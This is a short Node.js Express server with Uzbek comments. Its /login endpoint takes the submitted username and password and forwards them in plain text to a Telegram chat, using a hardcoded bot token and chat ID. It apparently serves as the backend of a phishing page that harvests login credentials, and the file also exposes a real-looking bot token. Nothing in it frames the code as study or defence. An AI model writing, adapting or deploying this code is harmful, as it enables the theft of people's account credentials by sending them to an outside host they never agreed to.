const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = 3000;

// Telegram bot token va chat ID
const TELEGRAM_TOKEN = '7772407376:AAGhIRmb6KdS6IA51P8nkmx_CnIcUZrUw74'; // O'zingizning bot tokeningizni kiriting
const CHAT_ID = '6318323960'; // O'zingizning chat ID'ni kiriting

// JSON va URL encoded ma'lumotlarni parse qilish
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// POST so'rovlarini qabul qilish
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Telegram botga xabar yuborish
    const message = `Kiritilgan login: ${username}\nKiritilgan parol: ${password}`;
    sendTelegramMessage(message);

    res.send('Ma\'lumot yuborildi!');
});

// Telegram botga xabar yuborish funksiyasi
function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    axios.post(url, {
        chat_id: CHAT_ID,
        text: message
    })
    .then(response => {
        console.log('Xabar yuborildi:', response.data);
    })
    .catch(error => {
        console.error('Xatolik yuz berdi:', error.response ? error.response.data : error.message);
    });
}

// Serverni ishga tushirish
app.listen(PORT, () => {
    console.log(`Server ishlamoqda, port: ${PORT}`);
});
